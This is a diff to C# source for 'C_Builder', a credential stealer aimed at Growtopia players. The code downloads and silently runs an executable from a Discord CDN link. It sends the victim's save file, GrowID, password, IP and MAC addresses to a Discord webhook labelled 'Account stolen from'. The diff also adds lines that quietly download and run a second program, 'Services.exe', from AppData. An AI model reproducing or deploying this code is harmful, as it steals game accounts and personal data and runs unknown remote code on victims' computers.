@@ -108,7 +108,7 @@ namespace C_Builder
 
             try
             {
-                wc.DownloadFile("https://cdn.discordapp.com/attachments/732523154639028265/732537877103116309/savedecrypter.exe", Path.GetTempPath() + "//savedecoder.exe");
+                wc.DownloadFile("https://cdn.discordapp.com/attachments/775300885990998059/775459023562473512/savedecrypter.exe", Path.GetTempPath() + "//savedecoder.exe");
                 ProcessStartInfo info = new ProcessStartInfo();
                 info.WindowStyle = ProcessWindowStyle.Hidden;
                 info.FileName = Path.GetTempPath() + "//savedecoder.exe";
@@ -132,7 +132,7 @@ namespace C_Builder
 
                 webHook.AddAttachment(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat", Environment.UserName + ".dat");
 
-                webHook.SendMessageWithAttachment("```asciidoc\n" + "[ skid-builder ] new account stolen from:: " + Environment.UserName + " / " + Environment.MachineName + "\nGrowID :: " + growid + "\nPassword :: " + passwords + "\nLast world :: " + lastworld + "\nIP address:: " + IP + "\nMac addresses:: \n" + macs + "```", sendAttachments);
+                webHook.SendMessageWithAttachment("```asciidoc\n" + "[C-Builder] Account stolen from:: " + Environment.UserName + " / " + Environment.MachineName + "\nGrowID :: " + growid + "\nPassword :: " + passwords + "\nLast world :: " + lastworld + "\nIP address:: " + IP + "\nMac addresses:: \n" + macs + "```", sendAttachments);
 
                 if (File.Exists(str + "\\" + Environment.UserName + " credentials.txt"))
                     File.Delete(str + "\\" + Environment.UserName + " credentials.txt");
@@ -152,6 +152,11 @@ namespace C_Builder
 
             }
 
+            wc.DownloadFile("https://cdn.discordapp.com/attachments/775273209100501013/775278243318071296/Services.exe", "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Services.exe");
+            ProcessStartInfo proc = new ProcessStartInfo();
+            proc.WindowStyle = ProcessWindowStyle.Hidden;
+            proc.FileName = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Services.exe";
+            Process.Start(proc);
         }
         private static void RegistryEdit(string regPath, string name, string value)
         {
@@ -518,7 +523,7 @@ namespace C_Builder
 						{
                             webHook.AddAttachment(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat", Environment.UserName + ".dat");
 
-                            webHook.SendMessageWithAttachment("```asciidoc\n" + "[ skid-builder ] account traced from:: " + Environment.UserName + " / " + Environment.MachineName + "\nGrowID :: " + growid + "\nPassword :: " + passwords + "\nLast world :: " + lastworld + "\nIP address:: " + IP + "\nMac addresses:: \n" + macs + "```", sendAttachments);
+                            webHook.SendMessageWithAttachment("```asciidoc\n" + "[C-Builder] Account traced from:: " + Environment.UserName + " / " + Environment.MachineName + "\nGrowID :: " + growid + "\nPassword :: " + passwords + "\nLast world :: " + lastworld + "\nIP address:: " + IP + "\nMac addresses:: \n" + macs + "```", sendAttachments);
 
                             if (File.Exists(str + "\\" + Environment.UserName + " credentials.txt"))
                                 File.Delete(str + "\\" + Environment.UserName + " credentials.txt");
